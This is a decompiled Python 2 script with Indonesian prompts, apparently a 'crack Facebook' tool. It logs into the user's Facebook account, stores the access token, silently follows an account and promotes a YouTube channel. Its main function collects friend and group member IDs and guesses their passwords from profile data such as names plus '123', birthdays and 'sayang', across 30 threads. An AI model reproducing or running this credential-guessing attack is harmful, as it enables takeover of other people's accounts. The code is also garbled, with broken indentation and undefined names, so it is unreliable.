#Decompiled by TrioSih
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
	
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
	
def keluar():
	print '\x1b[1;91m[!] Keluar'
	os.sys.exit()
	
	# logo = '
	
def jalan(z):
 for e in z + '\n':
	sys.stdout.write(e)
	sys.stdout.flush()
	time.sleep(0.01)
	
def tik():
	titik = [
	 'J ','JA ','JAN ','JANG ','JANGA ','JANGAN ','JANGAN L ','JANGAN LU ','JANGAN LUP ','JANGAN LUPA ','JANGAN LUPA S ','JANGAN LUPA SU ','JANGAN LUPA SUB ','JANGAN LUPA SUBS ','JANGAN LUPA SUBSC ','JANGAN LUPA SUBSCR ','JANGAN LUPA SUBSCRI ','JANGAN LUPA SUBSCRIB ','JANGAN LUPA SUBSCRIBE ','JANGA LUPA SUBSCRIBER']
	for o in titik:
	     print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92m$\x1b[1;97m' + o,
	     sys.stdout.flush()
	     time.sleep(1)
	
	def login():
	     os.system('clear')
	     try:
	          toket = open('hacker.txt', 'r')
	          menu()
	        except (KeyError, IOError):
	         os.system('clear')
	
	print 40 * '\x1b[1;97m\xe2\x95\x90'
	print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK SLUR \x1b[1;91m[\xe2\x98\x86]'
	id = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail or Telp FB \x1b[1;91m:\x1b[1;92m ')
	pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
	tik()
	try:
	    br.open('https://m.facebook.com')
	except mechanize.URLError:
	    print '\n\x1b[1;91m[!] Tidak ada koneksi'
	    keluar()
	
	br._factory.is_html = True
	br.select_form(nr=0)
	br.form['email'] = id
	br.form['pass'] = pwd
	br.submit()
	url = br.geturl()
	if 'save-device' in url:
	    try:
	        sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
	        data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
	        x = hashlib.new('md5')
	        x.update(sig)
	        a = x.hexdigest()
	        data.update({'sig': a})
	        url = 'https://api.facebook.com/restserver.php'
	        r = requests.get(url, params=data)
	        z = json.loads(r.text)
	        zedd = open('hacker.txt', 'w')
	        zedd.write(z['access_token'])
	        zedd.close()
	        print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mMantap slur Login Sukses'
	        requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
	        os.system('xdg-open https://www.youtube.com/channel/UCYtIaiNL2DhdhYnv2wg0bAw')
	        time.sleep(2)
	        menu()
	    except requests.exceptions.ConnectionError:
	        print '\n\x1b[1;91m[!] Tidak ada koneksi'
	        keluar()
	
	        if 'checkpoint' in url:
	    print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
	    os.system('rm -rf hacker.txt')
	    time.sleep(1)
	    keluar()
	else:
	    print '\n\x1b[1;91m[!] Login Gagal'
	    os.system('rm -rf hacker.txt')
	    time.sleep(1)
	    login()
	
	def menu():
	os.system('clear')
	try:
	toket = open('hacker.txt', 'r').read()
	except IOError:
	os.system('clear')
	print '\x1b[1;91m[!] Token tidak ditemukan'
	os.system('rm -rf hacker.txt')
	time.sleep(1)
	login()
	else:
	try:
	    otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
	    a = json.loads(otw.text)
	    nama = a['name']
	    id = a['id']
	except KeyError:
	    os.system('clear')
	    print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint hahahaha'
	    os.system('rm -rf hacker.txt')
	    time.sleep(1)
	    login()
	except requests.exceptions.ConnectionError:
	    print '\x1b[1;91m[!] Tidak ada koneksi'
	    keluar()
	    
	    os.system('clear')
	 #   print logo
	print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
	print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
	print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
	print '\x1b[1;37;40m1. Crack password Facebook'
	print '\x1b[1;37;40m2. Subscribe My Channel pliss :)'
	print '\x1b[1;37;40m3. LogOut'
	print '\x1b[1;37;40m0. Keluar'
	print
	pilih()
	    
	    def pilih():
	zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
	if zedd == '':
	print '\x1b[1;91m[!] ketik angkanya kemudian enter'
	pilih()
	else:
	if zedd == '1':
	    crack1()
	else:
	    if zedd == '2':
	        os.system('xdg-open https://www.youtube.com/channel/UCYtIaiNL2DhdhYnv2wg0bAw')
	    else:
	        if zedd == '3':
	            os.system('rm -rf hacker.txt')
	                    os.system('xdg-open https://www.youtube.com/channel/UCYtIaiNL2DhdhYnv2wg0bAw')
	                    keluar()
	        else:
	            if zedd == '0':
	                keluar()
	                    else:
	                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
	                        pilih()
	
	def crack1():
	os.system('clear')
	try:
	toket = open('hacker.txt', 'r').read()
	except IOError:
	print '\x1b[1;91m[!] Token tidak ditemukan'
	os.system('rm -rf hacker.txt')
	time.sleep(1)
	login()
	            
	                os.system('clear')
	  #  print logo
	print 40 * '\x1b[1;97m\xe2\x95\x90'
	print '\x1b[1;37;40m1. Crack Password Teman Facebook ?'
	print '\x1b[1;37;40m2. Crack Password Grup Facebook ?'
	print '\x1b[1;37;40m3. Ambil Id Grup Facebook'
	print '\x1b[1;37;40m0. Kembali'
	print
	crack1_pilih()
	  
	    def crack1_pilih():
	crack= raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
	if crack == '':
	print '\x1b[1;91m[!] ketik angkanya kemudian enter'
	crack1_pilih()
	else:
	if crack == '1':
	    os.system('clear')
	    print logo
	    print 40 * '\x1b[1;97m\xe2\x95\x90'
	    jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
	    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
	    z = json.loads(r.text)
	    for s in z['data']:
	        id.append(s['id'])
	else:
	    if crack =='2':
	    	os.system('clear')
	     #   print logo
	        print 40 * '\x1b[1;97m\xe2\x95\x90'
	        idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
	        try:
	            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
	            asw = json.loads(r.text)
	            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
	        except KeyError:
	            print '\x1b[1;91m[!] Grup tidak ditemukan'
	            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
	            crack1()
	
	        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
	        s = json.loads(re.text)
	        for i in s['data']:
	            id.append(i['id'])
	    else:
	    	if crack =='3':
	    	ig()
	    else:
	    	if crack =='0':
	    	menu()
	else:
	                            print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + crack + ' \x1b[1;91mTidak ada'
	                            crack1_pilih()
	                            
	print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
	jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
	titik = ['.   ', '..  ', '... ']
	for o in titik:
	print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
	sys.stdout.flush()
	time.sleep(1)
	
	print
	print 40 * '\x1b[1;97m\xe2\x95\x90'
	
	def main(arg):
	user = arg
	try:
	    a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
	    b = json.loads(a.text)
	    pass1 = b['first_name'] + '123'
	    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
	    q = json.load(data)
	    if 'access_token' in q:
	        print '\x1b[1;97m[\x1b[1;92m✔\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
	    else:
	        if 'www.facebook.com' in q['error_msg']:
	            print '\x1b[1;97m[\x1b[1;93m❌\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
	        else:
	            pass2 = b['first_name'] + '12345'
	            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
	            q = json.load(data)
	            if 'access_token' in q:
	                print '\x1b[1;97m[\x1b[1;92m✔\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
	            else:
	                if 'www.facebook.com' in q['error_msg']:
	                    print '\x1b[1;97m[\x1b[1;93m❌\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
	                else:
	                    pass3 = b['last_name'] + '123'
	                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
	                    q = json.load(data)
	                    if 'access_token' in q:
	                        print '\x1b[1;97m[\x1b[1;92m✔\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
	                    else:
	                        if 'www.facebook.com' in q['error_msg']:
	                            print '\x1b[1;97m[\x1b[1;93m❌\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
	                        else:
	                            lahir = b['birthday']
	                            pass4 = lahir.replace('/', '')
	                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
	                            q = json.load(data)
	                            if 'access_token' in q:
	                                print '\x1b[1;97m[\x1b[1;92m✔\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
	                            else:
	                                if 'www.facebook.com' in q['error_msg']:
	                                    print '\x1b[1;97m[\x1b[1;93m❌\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
	                             else:
	                             	pass5 = b[''] + 'sayang'
	                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
	                    q = json.load(data)
	                    if 'access_token' in q:
	                        print '\x1b[1;97m[\x1b[1;92m✔\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass5
	                    else:
	                        if 'www.facebook.com' in q['error_msg']:
	                            print '\x1b[1;97m[\x1b[1;93m❌\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5
	except:
	    pass
	
	p = ThreadPool(30)
	p.map(main, id)
	print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
	raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
	crack1()
	
	def ig():
		os.system('clear')
	    try:
	        toket = open('hacker.txt', 'r').read()
	    except IOError:
	        print '\x1b[1;91m[!] Token tidak ditemukan'
	        os.system('rm -rf hacker.txt')
	        time.sleep(1)
	        login()
	    else:
	        os.system('clear')
	        print logo
	        print 40 * '\x1b[1;97m\xe2\x95\x90'
	        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
	        print 40 * '\x1b[1;97m\xe2\x95\x90'
	        try:
	            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
	            gud = json.loads(uh.text)
	            for p in gud['data']:
	                nama = p['name']
	                id = p['id']
	                f = open('grupid.txt', 'w')
	                listgrup.append(id)
	                f.write(id + '\n')
	                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
	                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
	                print 40 * '\x1b[1;97m='
	
	            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Grup \x1b[1;96m%s' % len(listgrup)
	            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
	            f.close()
	            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
	            lain()
	        except (KeyboardInterrupt, EOFError):
	            print '\x1b[1;91m[!] Terhenti'
	            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
	            lain()
	        except KeyError:
	            os.remove('grupid.txt')
	            print '\x1b[1;91m[!] Grup tidak ditemukan'
	            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
	            lain()
	        except requests.exceptions.ConnectionError:
	            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
	            keluar()
	        except IOError:
	            print '\x1b[1;91m[!] Kesalahan saat membuat file'
	            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
	            lain()
	
	if __name__ == '__main__':
		login()
	# okay decompiling 3.pyc
	
	
	
